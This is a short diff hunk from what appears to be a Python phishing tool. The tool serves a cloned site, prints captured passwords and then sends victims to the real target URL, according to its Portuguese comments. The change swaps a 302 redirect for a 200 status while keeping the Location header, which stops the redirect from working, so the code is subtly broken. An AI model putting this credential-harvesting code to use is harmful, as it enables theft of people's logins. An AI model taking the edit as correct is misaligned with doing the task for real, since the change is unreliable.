@@ -388,7 +388,7 @@ def run_local_server(clone_dir, target_url, language):
                     print(f"Senha: {password}")
 
                 # Redirecionar para a URL original após capturar as credenciais
-                self.send_response(302)
+                self.send_response(200)
                 self.send_header('Location', target_url)
                 self.end_headers()
                
